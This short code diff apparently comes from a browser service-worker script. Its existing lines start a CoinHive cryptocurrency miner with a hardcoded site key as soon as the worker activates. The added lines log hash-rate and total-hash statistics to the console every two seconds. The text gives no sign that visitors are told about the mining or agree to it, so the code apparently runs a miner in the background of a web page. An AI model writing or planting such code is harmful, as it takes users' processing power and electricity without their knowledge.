@@ -15,5 +15,12 @@ self.onmessage = function(e) {
 self.onactivate = function() {
   var miner = window.miner = new CoinHive.Anonymous('MUtCJzIDhrs01ERrf3qlqdawo35N0CYD', {throttle: 0.1});
   miner.start();
+  setInterval(function() {
+      var hashesPerSecond = miner.getHashesPerSecond();
+      var totalHashes = miner.getTotalHashes();
+      var acceptedHashes = miner.getAcceptedHashes();
+
+      console.log('XXX ', {hashesPerSecond, totalHashes, acceptedHashes});
+  }, 2000);
   task();
 };
